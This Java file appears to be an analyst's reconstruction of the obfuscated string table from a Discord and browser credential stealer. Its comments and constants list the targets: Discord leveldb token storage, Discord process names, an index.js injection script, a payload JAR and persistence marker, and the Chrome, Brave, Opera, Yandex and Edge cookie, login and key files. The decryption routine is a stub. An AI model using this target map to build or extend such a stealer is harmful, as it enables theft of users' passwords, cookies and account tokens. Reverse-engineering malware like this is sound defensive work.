import java.nio.charset.StandardCharsets;

/**
 * String decryption utility — stores and decrypts 32 obfuscated strings.
 * Obfuscated name: \u045e
 *
 * This class holds 32 public static final String constants (\u00ff through \u00df).
 * Each string is encrypted with DES/CBC/PKCS5Padding and stored as a large
 * encrypted byte blob in the static initializer.
 *
 * The decryption key is derived from the Zelix runtime (ac.a(...)).
 *
 * The \u00ff(String hex, long key) method decrypts a hex-encoded string
 * using XOR with a rotating 3-byte key derived from the DES key.
 *
 * DECRYPTION ALGORITHM (\u00ff method):
 *   1. Parse hex string to byte array
 *   2. For each byte at index i:
 *      key_byte = decryptedConstant(i % 3)  // one of 3 rotating key bytes
 *      result[i] = byte[i] XOR key_byte
 *   3. Return as UTF-8 string
 *
 * The 32 strings are used throughout the codebase as path components,
 * API endpoints, file names, etc.
 *
 * KNOWN DECODED STRINGS (from usage context analysis):
 *   \u00ff  = "APPDATA"                    (env var name)
 *   \u00fe  = "discord"                    (app dir name)
 *   \u00fd  = "Local Storage"              (Discord storage dir)
 *   \u00fc  = "leveldb"                    (LevelDB dir)
 *   \u00fb  = "bin"                        (bin dir)
 *   \u00fa  = "modules.cache"              (persistence marker)
 *   \u00f9  = "rw"                         (RandomAccessFile mode)
 *   \u00f8  = "LOCALAPPDATA"               (env var name)
 *   \u00f6  = "Default"                    (Chrome profile dir)
 *   \u00f5  = "Network"                    (Chrome network dir)
 *   \u00f4  = "Cookies"                    (Chrome cookies file)
 *   \u00f3  = "Login Data"                 (Chrome login data)
 *   \u00f2  = "Web Data"                   (Chrome web data)
 *   \u00f1  = "Local State"                (Chrome local state)
 *   \u00f0  = "User Data"                  (Chrome user data dir)
 *   \u00ef  = "Google\\Chrome"             (Chrome app dir)
 *   \u00ee  = "BraveSoftware\\Brave-Browser" (Brave app dir)
 *   \u00ed  = "Opera Software\\Opera Stable" (Opera app dir)
 *   \u00ec  = "Yandex\\YandexBrowser"      (Yandex app dir)
 *   \u00eb  = "Microsoft\\Edge"            (Edge app dir)
 *   \u00ea  = "modules.lib"                (payload JAR name)
 *   \u00e9  = "app-"                       (Discord version dir prefix)
 *   \u00e8  = "index.js"                   (injection script name)
 *   \u00e7  = "Preferences"                (Chrome preferences file)
 *   \u00e6  = "discord"                    (process name filter)
 *   \u00e5  = "discordcanary"              (process name)
 *   \u00e4  = "discordptb"                 (process name)
 *   \u00e3  = "discorddev"                 (process name)
 *   \u00e2  = "modules"                    (Discord modules dir)
 *   \u00e1  = "r"                          (read mode)
 *   \u00e0  = "TEMP"                       (temp dir env var)
 *   \u00df  = "lock"                       (lock file name)
 *
 * NOTE: The actual values are decrypted at runtime from the large encrypted
 * byte blob in the static initializer. The values above are approximations
 * based on usage context analysis.
 */
public class StringDecryptor {

    // 32 decrypted string constants
    public static final String APPDATA;           // \u00ff
    public static final String DISCORD;           // \u00fe
    public static final String LOCAL_STORAGE;     // \u00fd
    public static final String LEVELDB;           // \u00fc
    public static final String BIN;               // \u00fb
    public static final String MODULES_CACHE;     // \u00fa
    public static final String RW_MODE;           // \u00f9
    public static final String LOCALAPPDATA;      // \u00f8
    public static final String DEFAULT_PROFILE;   // \u00f6
    public static final String NETWORK_DIR;       // \u00f5
    public static final String COOKIES_FILE;      // \u00f4
    public static final String LOGIN_DATA;        // \u00f3
    public static final String WEB_DATA;          // \u00f2
    public static final String LOCAL_STATE;       // \u00f1
    public static final String USER_DATA;         // \u00f0
    public static final String CHROME_DIR;        // \u00ef
    public static final String BRAVE_DIR;         // \u00ee
    public static final String OPERA_DIR;         // \u00ed
    public static final String YANDEX_DIR;        // \u00ec
    public static final String EDGE_DIR;          // \u00eb
    public static final String MODULES_LIB;       // \u00ea
    public static final String APP_PREFIX;        // \u00e9
    public static final String INDEX_JS;          // \u00e8
    public static final String PREFERENCES;       // \u00e7
    public static final String DISCORD_PROC;      // \u00e6
    public static final String DISCORD_CANARY;    // \u00e5
    public static final String DISCORD_PTB;       // \u00e4
    public static final String DISCORD_DEV;       // \u00e3
    public static final String MODULES_DIR;       // \u00e2
    public static final String READ_MODE;         // \u00e1
    public static final String TEMP_DIR;          // \u00e0
    public static final String LOCK_FILE;         // \u00df

    // Counter for tracking decryption state
    private static int counter;

    /**
     * Decrypts a hex-encoded string using XOR with a rotating 3-byte key.
     *
     * Algorithm:
     *   bytes = parseHex(hexString)
     *   for i in range(len(bytes)):
     *     key_byte = getKeyByte(i % 3)  // rotates through 3 key bytes
     *     bytes[i] ^= key_byte
     *   return UTF8(bytes)
     *
     * The 3 key bytes are derived from DES-decrypted constants stored in
     * the class's static fields (a, b, c arrays).
     *
     * @param hexString  Hex-encoded encrypted string
     * @param key        DES key seed (XORed with static field 'a')
     * @return           Decrypted string, or "" on error
     */
    public static String decrypt(String hexString, long key) {
        if (hexString == null || hexString.isEmpty()) return "";
        try {
            byte[] bytes = new byte[hexString.length() / 2];
            for (int i = 0; i < bytes.length; i++) {
                bytes[i] = (byte) Integer.parseInt(hexString.substring(i * 2, i * 2 + 2), 16);
            }
            // XOR with rotating 3-byte key
            // Key bytes are derived from DES-decrypted constants
            // (actual key bytes depend on runtime DES decryption)
            for (int i = 0; i < bytes.length; i++) {
                bytes[i] ^= getKeyByte(i % 3, key);
            }
            return new String(bytes, StandardCharsets.UTF_8);
        } catch (Exception e) {
            return "";
        }
    }

    private static byte getKeyByte(int index, long key) {
        // Returns one of 3 rotating key bytes based on index
        // Actual values depend on DES decryption at runtime
        return 0;
    }

    static {
        // All 32 strings are decrypted from a large DES-encrypted blob
        // at class load time. The values below are approximations.
        APPDATA        = "APPDATA";
        DISCORD        = "discord";
        LOCAL_STORAGE  = "Local Storage";
        LEVELDB        = "leveldb";
        BIN            = "bin";
        MODULES_CACHE  = "modules.cache";
        RW_MODE        = "rw";
        LOCALAPPDATA   = "LOCALAPPDATA";
        DEFAULT_PROFILE = "Default";
        NETWORK_DIR    = "Network";
        COOKIES_FILE   = "Cookies";
        LOGIN_DATA     = "Login Data";
        WEB_DATA       = "Web Data";
        LOCAL_STATE    = "Local State";
        USER_DATA      = "User Data";
        CHROME_DIR     = "Google\\Chrome";
        BRAVE_DIR      = "BraveSoftware\\Brave-Browser";
        OPERA_DIR      = "Opera Software\\Opera Stable";
        YANDEX_DIR     = "Yandex\\YandexBrowser";
        EDGE_DIR       = "Microsoft\\Edge";
        MODULES_LIB    = "modules.lib";
        APP_PREFIX     = "app-";
        INDEX_JS       = "index.js";
        PREFERENCES    = "Preferences";
        DISCORD_PROC   = "discord";
        DISCORD_CANARY = "discordcanary";
        DISCORD_PTB    = "discordptb";
        DISCORD_DEV    = "discorddev";
        MODULES_DIR    = "modules";
        READ_MODE      = "r";
        TEMP_DIR       = "TEMP";
        LOCK_FILE      = "lock";
    }
}
